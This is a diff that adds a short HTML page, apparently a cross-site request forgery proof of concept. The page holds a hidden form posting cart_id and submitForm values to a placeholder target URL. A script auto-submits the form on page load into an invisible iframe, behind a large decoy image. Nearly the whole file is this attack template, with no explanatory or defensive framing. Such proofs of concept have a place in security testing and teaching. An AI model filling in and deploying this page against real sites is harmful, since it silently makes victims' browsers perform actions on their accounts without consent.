@@ -1,0 +1,23 @@
+<html>
+    <body>
+        
+        <form 
+            method='POST' 
+            action='target url'
+            target="hiddenFrame"
+            id="csrf_form">
+            <input type='hidden' value='' name='cart_id'>
+            <input type='hidden' name='submitForm' value=''>
+        </form>
+        <iframe name="hiddenFrame" style="display: none;"></iframe>
+    
+    <script>
+        document.getElementById('csrf_form').submit()
+    </script>
+
+     <img src="image to be added"
+            width="1900" 
+            height="900" />
+
+    </body>
+</html>
